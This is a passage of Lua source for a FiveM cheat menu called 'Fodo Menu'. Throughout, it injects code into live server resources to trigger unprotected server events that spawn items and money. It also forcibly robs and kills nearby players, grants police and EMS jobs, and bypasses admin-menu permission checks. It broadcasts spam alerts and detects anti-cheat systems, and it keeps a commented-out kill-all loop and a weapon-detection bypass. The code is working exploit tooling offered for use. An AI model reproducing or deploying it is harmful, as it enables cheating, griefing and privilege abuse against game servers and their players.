                    for _, ip in ipairs(ServerIP) do
                        if CurrentIP == ip then return true end
                    end
                    return false
                end

                local CurrentIP = GetCurrentServerEndpoint()

                if IsAllowedIP(CurrentIP) then
                    MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                        local function LkJfQwOp78()
                            Wait(1)
                            TriggerServerEvent('jg-mechanic:server:buy-item', "]] .. ItemName .. [[", 0, ]] .. ItemAmount .. [[, "TheCultMechShop", 1)
                        end
                        LkJfQwOp78()
                    ]])
                end
            end
        }

        local ResourceFound = false
        for ResourceName, action in pairs(resourceActions) do
            if GetResourceState(ResourceName) == "started" then
                action()
                ResourceFound = true
                break
            end
        end 

        if not ResourceFound then
            MachoMenuNotification("[NOTIFICATION] Fodo Menu", "No Triggers Found.")
        end
    else
        MachoMenuNotification("[NOTIFICATION] Fodo Menu", "Invalid Item or Amount.")
    end
end)

MoneyInputBox = MachoMenuInputbox(EventTabSections[2], "Amount:", "...")
MachoMenuButton(EventTabSections[2], "Spawn", function()
    local ItemAmount = MachoMenuGetInputbox(MoneyInputBox)

    if ItemAmount and tonumber(ItemAmount) then
        local Amount = tonumber(ItemAmount)

        local resourceActions = {
            ["codewave-lashes-phone"] = function()
                MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardlashes', ]] .. Amount .. [[)
                ]])
            end,

            ["codewave-nails-phone"] = function()
                MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardnails', ]] .. Amount .. [[)
                ]])
            end,

            ["codewave-caps-client-phone"] = function()
                MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardCaps', ]] .. Amount .. [[)
                ]])
            end,

            ["codewave-wigs-v3-phone"] = function()
                MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardWigss', ]] .. Amount .. [[)
                ]])
            end,

            ["codewave-icebox-phone"] = function()
                MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardiceboxs', ]] .. Amount .. [[)
                ]])
            end,

            ["codewave-sneaker-phone"] = function()
                MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardShoes', ]] .. Amount .. [[)
                ]])
            end,

            ["codewave-handbag-phone"] = function()
                MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardhandbags', ]] .. Amount .. [[)
                ]])
            end,
        }

        local ResourceFound = false
        for ResourceName, action in pairs(resourceActions) do
            if GetResourceState(ResourceName) == "started" then
                action()
                ResourceFound = true
                break
            end
        end

        if not ResourceFound then
            MachoMenuNotification("[NOTIFICATION] Fodo Menu", "No Triggers Found.")
        end
    else
        MachoMenuNotification("[NOTIFICATION] Fodo Menu", "Invalid Item or Amount.")
    end
end)

local TriggerBoxHandle = MachoMenuInputbox(EventTabSections[4], "Event:", "...")
local TriggerEventHandle = MachoMenuInputbox(EventTabSections[4], "Type:", "...")
local TriggerResourceHandle = MachoMenuInputbox(EventTabSections[4], "Resource:", "...")

local FallbackResources = {
    "monitor",
    "any"
}

MachoMenuButton(EventTabSections[4], "Execute", function()
    local RawInput = MachoMenuGetInputbox(TriggerBoxHandle)
    local TriggerType = MachoMenuGetInputbox(TriggerEventHandle)
    local TargetResource = MachoMenuGetInputbox(TriggerResourceHandle)

    if not RawInput or RawInput == "" then return end

    local argsChunk, err = load("return function() return " .. RawInput .. " end")
    if not argsChunk then return end

    local fnOk, fnOrErr = pcall(argsChunk)
    if not fnOk or type(fnOrErr) ~= "function" then return end

    local results = { pcall(fnOrErr) }
    if not results[1] then return end

    local eventName = results[2]
    local args = {}
    for i = 3, #results do
        table.insert(args, results[i])
    end

    local function formatValue(v)
        if type(v) == "string" then
            return string.format("%q", v)
        elseif type(v) == "number" or type(v) == "boolean" then
            return tostring(v)
        elseif type(v) == "table" then
            local ok, encoded = pcall(function() return json.encode(v) end)
            return ok and string.format("json.decode(%q)", encoded) or "nil"
        else
            return "nil"
        end
    end

    local formattedArgs = {}
    for _, v in ipairs(args) do
        table.insert(formattedArgs, formatValue(v))
    end
    local argsCode = #formattedArgs > 0 and table.concat(formattedArgs, ", ") or ""

    local triggerCode = string.format([[
        local event = %q
        local triggerType = string.lower(%q)
        local args = { %s }

        if triggerType == "server" then
            TriggerServerEvent(event, table.unpack(args))
        else
            TriggerEvent(event, table.unpack(args))
        end
    ]], tostring(eventName), string.lower(TriggerType or "client"), argsCode)

    local foundResource = nil

    if TargetResource and TargetResource ~= "" then
        if GetResourceState(TargetResource) == "started" then
            foundResource = TargetResource
        end
    else
        for _, fallback in ipairs(FallbackResources) do
            if GetResourceState(fallback) == "started" then
                foundResource = fallback
                break
            end
        end
    end

    if foundResource then
        MachoInjectResource(foundResource, triggerCode)
    end
end)

local TriggerDropDownChoice = 0

local TriggerMap = {
    [0] = {
        name = "[E] Force Rob",
        resource = nil,
        code = nil
    },

    [1] = {
        name = "Phantom RP",
        resource = nil,
        code = [[
            local function ffff()
                CreateThread(function()
                    for i = 1, 100 do
                        local function e123()
                            local coords = GetEntityCoords(PlayerPedId())
                            TriggerServerEvent('qb-diving:server:TakeCoral', coords, coral, true)
                            Wait(3)
                        end

                        e123()

                        TriggerServerEvent('qb-diving:server:SellCorals')
                    end
                end)
            end

            ffff()
        ]]
    }
}

MachoMenuDropDown(EventTabSections[3], "Exploit Choice", function(index)
    TriggerDropDownChoice = index
end,
    TriggerMap[0].name,
    TriggerMap[1].name
)

MachoMenuButton(EventTabSections[3], "Execute", function()
    local trigger = TriggerMap[TriggerDropDownChoice]
    if not trigger then return end

    if TriggerDropDownChoice == 0 then
        local ActiveInventory = nil
        local Resources = {
            "ox_inventory", "ox_doorlock", "ox_fuel", "ox_target", "ox_lib", "ox_sit", "ox_appearance"
        }

        local InventoryResources = { 
            ox = "ox_inventory", 
            qb = "qb-inventory"
        }

        for Key, Resource in pairs(InventoryResources) do
            if GetResourceState(Resource) == "started" then
                ActiveInventory = Key
                break
            end
        end

        for _, Resource in ipairs(Resources or {}) do
            if GetResourceState(Resource) == "started" then
                MachoInjectResource2(3, Resource, ([[
                    local function awt72q48dsgn()
                        local awgfh347gedhs = CreateThread
                        awgfh347gedhs(function()
                            local dict = 'missminuteman_1ig_2'
                            local anim = 'handsup_enter'

                            RequestAnimDict(dict)
                            while not HasAnimDictLoaded(dict) do
                                Wait(0)
                            end

                            while true do
                                Wait(0)
                                if IsDisabledControlJustPressed(0, 38) then
                                    local selfPed = PlayerPedId()
                                    local selfCoords = GetEntityCoords(selfPed)
                                    local closestPlayer = -1
                                    local closestDistance = -1

                                    for _, player in ipairs(GetActivePlayers()) do
                                        local targetPed = GetPlayerPed(player)
                                        if targetPed ~= selfPed then
                                            local coords = GetEntityCoords(targetPed)
                                            local dist = #(selfCoords - coords)
                                            if closestDistance == -1 or dist < closestDistance then
                                                closestDistance = dist
                                                closestPlayer = player
                                            end
                                        end
                                    end

                                    if closestPlayer ~= -1 and closestDistance <= 3.0 then
                                        local ped = GetPlayerPed(closestPlayer)

                                        local CEPressPlayer = SetEnableHandcuffs
                                        local CEDeadPlayerCheck = SetEntityHealth

                                        if not IsPedCuffed(ped) then
                                            CEPressPlayer(ped, true)
                                            CEDeadPlayerCheck(ped, 0)
                                            CEPressPlayer(ped, true)
                                        end

                                        if not IsEntityPlayingAnim(ped, dict, anim, 13) then
                                            TaskPlayAnim(ped, dict, anim, 8.0, 8.0, -1, 50, 0, false, false, false)
                                        end
                                        
                                        local ActiveInventory = "%s"
                                        local serverId = GetPlayerServerId(closestPlayer)
                                        if ActiveInventory == "ox" then
                                            TriggerEvent('ox_inventory:openInventory', 'otherplayer', serverId)
                                        elseif ActiveInventory == "qb" then
                                            TriggerServerEvent('inventory:server:OpenInventory', 'otherplayer', serverId)
                                        end
                                    end
                                end
                            end
                        end)
                    end

                    awt72q48dsgn()

                ]]):format(ActiveInventory))
                break
            end
        end
    else
        MachoInjectResource2(3, trigger.resource, trigger.code)
    end
end)

-- VIP Tab
ItemNameHandle = MachoMenuInputbox(VIPTabSections[1], "Name:", "...")
ItemAmountHandle = MachoMenuInputbox(VIPTabSections[1], "Amount:", "...")

MachoMenuButton(VIPTabSections[1], "Spawn", function()
    if not HasValidKey() then return end

    local ItemName = MachoMenuGetInputbox(ItemNameHandle)
    local ItemAmount = MachoMenuGetInputbox(ItemAmountHandle)

    if ItemName and ItemName ~= "" and ItemAmount and tonumber(ItemAmount) then
        local Amount = tonumber(ItemAmount)
        local resourceActions = {
            ["qb-uwujob"] = function() 
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                    local function aswdaw4atsdf()
                        TriggerServerEvent("qb-uwujob:addItem", "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                    end

                    aswdaw4atsdf()
                ]])
            end,
            
            -- ["coinShop"] = function()
            --     MachoInjectResource("coinShop", [[
            --         local function wafawhjaw5r7f()
            --             if "]] .. ItemName .. [[" == "money" or "]] .. ItemName .. [[" == "bank" or "]] .. ItemName .. [[" == "black_money" then
            --                 local itemData = {
            --                     account = "]] .. ItemName .. [[",
            --                     money = ]] .. ItemAmount .. [[
            --                 }
            --             else
            --                 local itemData = {
            --                     item = "]] .. ItemName .. [[",
            --                     count = ]] .. ItemAmount .. [[
            --                 }
            --             end

            --             lib.callback.await("bs:cs:giveItem", false, itemData)
            --         end

            --         wafawhjaw5r7f()
            --     ]])
            -- end,

            ["skirpz_drugplug"] = function()
                MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                    local function fawfafffsfzxfzx()
                        XTYZ = CreateThread
                        XTYZ(function()
                            for i = 1, ]] .. ItemAmount .. [[ do
                                local fododealer = "fodolol" .. math.random(1000,9999)
                                Fodo_TriggerServerEvent = TriggerServerEvent
                                Fodo_TriggerServerEvent('shop:purchaseItem', fododealer, ']] .. ItemName .. [[', 0)
                                Wait(100)
                            end
                        end)
                    end


                    fawfafffsfzxfzx()
                ]])
            end,

            ["ak47_whitewidowv2"] = function()
                MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                    local function aXj49WqTpL()
                        local keyName = "ak47_whitewidowv2:process"
                        TriggerServerEvent(keyName, "]] .. ItemName .. [[", {money = 0}, ]] .. ItemAmount .. [[, 0)
                    end
                    aXj49WqTpL()
                ]])
            end,

            ["ak47_business"] = function()
                MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                    local function agjw37257gj()
                        local keyName = "ak47_business:processed"
                        TriggerServerEvent(keyName, "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                    end

                    agjw37257gj()
                ]])
            end,

            ["ars_hunting"] = function()
                MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                    local function ZqMwLpTrYv()
                        local keyName = "ars_hunting:sellBuyItem"
                        TriggerServerEvent(keyName, { buy = true, item = "]] .. ItemName .. [[", price = 0, quantity = ]] .. ItemAmount .. [[ })
                    end

                    ZqMwLpTrYv()
                ]])
            end,

            ["fivecode_camping"] = function()
                MachoInjectResource2(3, (CheckResource("monitor") and "monitor") or "any", [[
                    local function GnRtCvXpKa()
                        local keyName = 'fivecode_camping:callCallback'
                        local KeyNameParams = 'fivecode_camping:shopPay'
                        TriggerServerEvent(keyName, KeyNameParams, 0, {
                            ['price'] = 0,
                            ['item'] = "]] .. ItemName .. [[",
                            ['amount'] = ]] .. ItemAmount .. [[,
                            ['label'] = 'FODO'
                        }, {
                            ['args'] = {
                                ['payment'] = {
                                    ['bank'] = true,
                                    ['cash'] = true
                                }
                            },
                            ['entity'] = 9218,
                            ['distance'] = 0.64534759521484,
                            ['hide'] = false,
                            ['type'] = 'bank',
                            ['label'] = 'Open Shop',
                            ['coords'] = 'vector3(-773.2181, 5597.66, 33.97217)',
                            ['name'] = 'npcShop-vec4(-773.409973, 5597.819824, 33.590000, 172.910004)'
                        })
                    end

                    GnRtCvXpKa()
                ]])
            end,

            ["spoodyGunPlug"] = function()
                MachoInjectResource2(3, (CheckResource("spoodyGunPlug") and "spoodyGunPlug") or "any", [[
                    local function GnRtCvXpKa()
                        common:giveItem({ { item = "]] .. ItemName .. [[", amount = ]] .. ItemAmount .. [[ } })  
                    end

                    GnRtCvXpKa()
                ]])
            end,

            ["solos-weedtable"] = function()
                MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                    local function aqrqtsgw32w523w()
                        local keyName = "solos-weed:server:itemadd"
                        TriggerServerEvent(keyName, "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                    end

                    aqrqtsgw32w523w()
                ]])
            end
        }

        local ResourceFound = false
        for ResourceName, action in pairs(resourceActions) do
            if GetResourceState(ResourceName) == "started" then
                action()
                ResourceFound = true
                -- break
            end
        end 

        if not ResourceFound then
            MachoMenuNotification("[NOTIFICATION] Fodo Menu", "No Triggers Found.")
        end
    else
        MachoMenuNotification("[NOTIFICATION] Fodo Menu", "Invalid Item or Amount.")
    end
end)

MachoMenuButton(VIPTabSections[2], "Police Job", function()
    if not HasValidKey() then return end

    if CheckResource("wasabi_multijob") then
        MachoInjectResource("wasabi_multijob", [[
            local job = { label = "Police", name = "police", grade = 1, grade_label = "Officer", grade_name = "officer" }
            CheckJob(job, true) 
        ]])
    else
        MachoMenuNotification("[NOTIFICATION] Fodo Menu", "Resource Not Found.")
    end
end)

MachoMenuButton(VIPTabSections[2], "EMS Job", function()
    if not HasValidKey() then return end

    if CheckResource("wasabi_multijob") then
        MachoInjectResource("wasabi_multijob", [[
            local job = { label = "EMS", name = "ambulance", grade = 1, grade_label = "Medic", grade_name = "medic" }
            CheckJob(job, true) 
        ]])
    else
        MachoMenuNotification("[NOTIFICATION] Fodo Menu", "Resource Not Found.")
    end
end)

MachoMenuButton(VIPTabSections[3], "Staff (1) (BETA) - Menu", function()
    if not HasValidStaffKey() then return end

    if CheckResource("mc9-adminmenu") then
        MachoInjectResource2(2, 'mc9-adminmenu', [[
            _G.lib = _G.lib or lib
            _G.QBCore = _G.QBCore or exports['qb-core']:GetCoreObject()

            _G.lib.callback.register("mc9-adminmenu:callback:GetAllowedActions", function()
                local all = {}
                for k, v in pairs(_G.Config.Actions) do
                    all[k] = true
                end
                return all
            end)

            _G.CheckPerms = function(_)
                return true
            end

            _G.setupMenu = function()
                _G.PlayerData = _G.QBCore.Functions.GetPlayerData()
                _G.QBCore.Shared.Vehicles = _G.lib.callback.await("mc9-adminmenu:callback:GetSharedVehicles", false)
                _G.resources = _G.lib.callback.await("mc9-adminmenu:callback:GetResources", false)
                _G.commands = _G.lib.callback.await("mc9-adminmenu:callback:GetCommands", false)
                _G.GetData()

                _G.actions = {}
                for k, v in pairs(_G.Config.Actions) do
                    _G.actions[k] = v
                end

                _G.playerActions = {}
                for k, v in pairs(_G.Config.PlayerActions or {}) do
                    _G.playerActions[k] = v
                end

                _G.otherActions = {}
                for k, v in pairs(_G.Config.OtherActions or {}) do
                    _G.otherActions[k] = v
                end

                _G.SendNUIMessage({
                    action = "setupUI",
                    data = {
                        actions = _G.actions,
                        playerActions = _G.playerActions,
                        otherActions = _G.otherActions,
                        resources = _G.resources,
                        playerData = _G.PlayerData,
                        commands = _G.commands,
                        weapons = _G.QBCore.Shared.Weapons,
                    }
                })

                _G.uiReady = true
            end

            _G.setupMenu()
            _G.ToggleUI(true)
        ]])
    else
        MachoMenuNotification("[NOTIFICATION] Fodo Menu", "Resource Not Found.")
    end
end)

MachoMenuButton(VIPTabSections[3], "Staff (2) (BETA) - Announce", function()
    if not HasValidStaffKey() then return end

    if CheckResource("ps-dispatch") then
        MachoInjectResource2(2, 'ps-dispatch', [[
            local AllJobs = {
                'police','sheriff','state','ranger','ambulance','ems','doc','doj',
                'mechanic','bennys','lsc','tow','taxi','bus','trucker','garbage',
                'news','realestate','cardealer','gruppe6','casino','government','judge','lawyer',
                'unemployed'
            }

            local data = {
                message = 'Hey, I’m Tappy — one of the best devs in the FiveM scene. Hit me up: discord.gg/gamerware - P.S. WoodyTheDev',
                codeName = 'x9_blast',
                code = 'discord.gg/gamerware',
                icon = 'fas fa-bullhorn',
                priority = 1,
                coords = vector3(0.0, 0.0, 0.0),
                alertTime = 9999,
                jobs = AllJobs,
                alert = { radius=200, sprite=84, color=1, scale=2.0, length=15, flash=true }
            }

            local function WoodyBETA()
                _G.Twiga = TriggerServerEvent
                _G.Twiga('ps-dispatch:server:notify', data)
            end

            WoodyBETA()
        ]])
    else
        MachoMenuNotification("[NOTIFICATION] Fodo Menu", "Resource Not Found.")
    end
end)

-- MachoMenuCheckbox(VIPTabSections[3], "RPG Kill Everyone", function()
--     if not HasValidKey() then return end
    
--     MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
--         if tUOgshhvIaku == nil then tUOgshhvIaku = false end
--         tUOgshhvIaku = true

--         local function bZxLmNcVqPeTyUi()
--             local vBnMkLoPi = PlayerPedId()
--             local wQaSzXedC = GetHashKey("WEAPON_PASSENGER_ROCKET")
--             local eDxCfVgBh = 100
--             local lKjHgFdSa = 1000.0
--             local mAxPlErOy = 300.0

--             local rTwEcVzUi = CreateThread
--             local oPiLyKuJm = ShootSingleBulletBetweenCoords

--             rTwEcVzUi(function()
--                 while tUOgshhvIaku and not Unloaded do
--                     Wait(eDxCfVgBh)
--                     local aSdFgHjKl = GetActivePlayers()
--                     local xSwEdCvFr = GetEntityCoords(vBnMkLoPi)

--                     for _, bGtFrEdCv in ipairs(aSdFgHjKl) do
--                         local nMzXcVbNm = GetPlayerPed(bGtFrEdCv)
--                         if nMzXcVbNm ~= vBnMkLoPi and DoesEntityExist(nMzXcVbNm) and not IsPedDeadOrDying(nMzXcVbNm, true) then
--                             local zAsXcVbNm = GetEntityCoords(nMzXcVbNm)
--                             if #(zAsXcVbNm - xSwEdCvFr) <= mAxPlErOy then
--                                 local jUiKoLpMq = vector3(
--                                     zAsXcVbNm.x + (math.random() - 0.5) * 0.8,
--                                     zAsXcVbNm.y + (math.random() - 0.5) * 0.8,
--                                     zAsXcVbNm.z + 1.2
--                                 )

--                                 local cReAtEtHrEaD = vector3(
--                                     zAsXcVbNm.x,
--                                     zAsXcVbNm.y,
--                                     zAsXcVbNm.z + 0.2
--                                 )

--                                 oPiLyKuJm(
--                                     jUiKoLpMq.x, jUiKoLpMq.y, jUiKoLpMq.z,
--                                     cReAtEtHrEaD.x, cReAtEtHrEaD.y, cReAtEtHrEaD.z,
--                                     lKjHgFdSa,
--                                     true,
--                                     wQaSzXedC,
--                                     vBnMkLoPi,
--                                     true,
--                                     false,
--                                     100.0
--                                 )
--                             end
--                         end
--                     end
--                 end
--             end)
--         end

--         bZxLmNcVqPeTyUi()
--     ]])
-- end, function()
--     MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
--         tUOgshhvIaku = false
--     ]])
-- end)

-- MachoMenuButton(VIPTabSections[3], "Spoofed Weapon Bypass", function()
--     if not HasValidKey() then return end

--     local payload = [[
--         _G.GetCurrentPedWeapon = function() return -1569615261 end
--         _G.IsPedSwappingWeapon = function() return false end
--         _G.GetSelectedPedWeapon = function() return -1569615261 end
--         _G.GetWeapontypeGroup = function() return -1569615261 end
--         _G.IsPedArmed = function() return false end
--         _G.HasPedGotWeapon = function() return false end
--         _G.IsPedShooting = function() return false end
--         _G.WasPedShooting = function() return false end
--         _G.RemoveAllPedWeapons = function() return false end
--         _G.RemoveWeaponFromPed = function() return false end
--         _G.IsPedDoingDriveby = function() return false end
--         _G.IsPedSwitchingWeapon = function() return false end
--         _G.GetBestPedWeapon = function() return -1569615261 end
--         _G.GetAmmoInPedWeapon = function() return 0 end
--         _G.GetPedAmmoTypeFromWeapon = function() return 0 end
--         _G.GetCurrentPedWeaponEntityIndex = function() return -1 end
--         _G.GetPedAmmoTypeFromWeapon_2 = function() return 0 end
--         _G.GetWeapontypeModel = function() return -1569615261 end
--         _G.GetEntityType = function() return 0 end
--         _G.GetEntityAttachedTo = function() return false end
--         _G.GetWeaponNameFromHash = function() return -1569615261 end
--         _G.IsPedReloading = function() return false end
--     ]]

--     local function awfawrwr3wsd()
--             local afwjawauw5sd = CreateThread
--             afwjawauw5sd(function()
--             for i = 0, GetNumResources() - 1 do
--                 local resourcename = GetResourceByFindIndex(i)
--                 if resourcename and GetResourceState(resourcename) == "started" then
--                     MachoInjectResource(resourcename, string.format([[
--                         print("[ GAMERWARE ] - Resource Name: %s")
--                         %s
--                     ]], resourcename, payload))
--                     Wait(200)
--                 end
--             end
--         end)
--     end
-- end)

-- Settings Tab
MachoMenuButton(SettingTabSections[1], "Unload", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        Unloaded = true
    ]])

    MachoInjectResource((CheckResource("core") and "core") or (CheckResource("es_extended") and "es_extended") or (CheckResource("qb-core") and "qb-core") or (CheckResource("monitor") and "monitor") or "any", [[
        anvzBDyUbl = false
        if fLwYqKoXpRtB then fLwYqKoXpRtB() end
        kLpMnBvCxZqWeRt = false
    ]])

    MachoMenuDestroy(MenuWindow)
end)

MachoMenuCheckbox(SettingTabSections[2], "RGB Menu", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if FmxmAlwkjfsfmaW == nil then FmxmAlwkjfsfmaW = false end
        FmxmAlwkjfsfmaW = true

        local function CreateRGBUI()
            local wfgsmWAEJKF = CreateThread
            wfgsmWAEJKF(function()
                local offset = 0.0
                while FmxmAlwkjfsfmaW and not Unloaded do
                    offset = offset + 0.065
                    local r = math.floor(127 + 127 * math.sin(offset))
                    local g = math.floor(127 + 127 * math.sin(offset + 2))
                    local b = math.floor(127 + 127 * math.sin(offset + 4))
                    MachoMenuSetAccent(MenuWindow, r, g, b)
                    Wait(25)
                end
            end)
        end

        CreateRGBUI()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        FmxmAlwkjfsfmaW = false
    ]])
end)

local r, g, b = 52, 137, 235

MachoMenuSlider(SettingTabSections[2], "R", r, 0, 255, "", 0, function(value)
    r = value
    MachoMenuSetAccent(MenuWindow, math.floor(r), math.floor(g), math.floor(b))
end)

MachoMenuSlider(SettingTabSections[2], "G", g, 0, 255, "", 0, function(value)
    g = value
    MachoMenuSetAccent(MenuWindow, math.floor(r), math.floor(g), math.floor(b))
end)

MachoMenuSlider(SettingTabSections[2], "B", b, 0, 255, "", 0, function(value)
    b = value
    MachoMenuSetAccent(MenuWindow, math.floor(r), math.floor(g), math.floor(b))
end)

MachoMenuButton(SettingTabSections[3], "Anti-Cheat Checker", function()
    local function notify(fmt, ...)
        MachoMenuNotification("[NOTIFICATION] Fodo Menu", string.format(fmt, ...))
    end

    local function ResourceFileExists(resourceNameTwo, fileNameTwo)
        local file = LoadResourceFile(resourceNameTwo, fileNameTwo)
        return file ~= nil
    end

    local numResources = GetNumResources()

    local acFiles = {
        { name = "ai_module_fg-obfuscated.lua", acName = "FiveGuard" },
    }

    for i = 0, numResources - 1 do
        local resourceName  = GetResourceByFindIndex(i)
        local resourceLower = string.lower(resourceName)

        for _, acFile in ipairs(acFiles) do
            if ResourceFileExists(resourceName, acFile.name) then
                notify("Anti-Cheat: %s", acFile.acName)
                AntiCheat = acFile.acName
                return resourceName, acFile.acName
            end
        end

        local friendly = nil
        if resourceLower:sub(1, 7) == "reaperv" then
            friendly = "ReaperV4"
        elseif resourceLower:sub(1, 4) == "fini" then
            friendly = "FiniAC"
        elseif resourceLower:sub(1, 7) == "chubsac" then
            friendly = "ChubsAC"
        elseif resourceLower:sub(1, 6) == "fireac" then
            friendly = "FireAC"
        elseif resourceLower:sub(1, 7) == "drillac" then
            friendly = "DrillAC"
        elseif resourceLower:sub(-7) == "eshield" then
            friendly = "WaveShield"
        elseif resourceLower:sub(-10) == "likizao_ac" then
            friendly = "Likizao-AC"
        elseif resourceLower:sub(1, 5) == "greek" then
            friendly = "GreekAC"
        elseif resourceLower == "pac" then
            friendly = "PhoenixAC"
        elseif resourceLower == "electronac" then
            friendly = "ElectronAC"
        end

        if friendly then
            notify("Anti-Cheat: %s", friendly)
            AntiCheat = friendly
            return resourceName, friendly
        end
    end

    notify("No Anti-Cheat found")
    return nil, nil
end)

MachoMenuButton(SettingTabSections[3], "Framework Checker", function()
    local function notify(fmt, ...)
        MachoMenuNotification("[NOTIFICATION] Fodo Menu", string.format(fmt, ...))
    end

    local function IsStarted(res)
        return GetResourceState(res) == "started"
    end

    local frameworks = {
        { label = "ESX",       globals = { "ESX" },    resources = { "es_extended", "esx-legacy" } },
        { label = "QBCore",    globals = { "QBCore" }, resources = { "qb-core" } },
        { label = "Qbox",      globals = {},           resources = { "qbox" } },
        { label = "QBX Core",  globals = {},           resources = { "qbx-core" } },
        { label = "ox_core",   globals = { "Ox" },     resources = { "ox_core" } },
        { label = "ND_Core",   globals = { "NDCore" }, resources = { "nd-core", "ND_Core" } },
        { label = "vRP",       globals = { "vRP" },    resources = { "vrp" } },
    }

    local function DetectFramework()
        for _, fw in ipairs(frameworks) do
            for _, g in ipairs(fw.globals) do
                if _G[g] ~= nil then
                    return fw.label
                end
            end
        end
        for _, fw in ipairs(frameworks) do
            for _, r in ipairs(fw.resources) do
                if IsStarted(r) then
                    return fw.label
                end
            end
        end
        return "Standalone"
    end

    local frameworkName = DetectFramework()
    notify("Framework: %s", frameworkName)
end)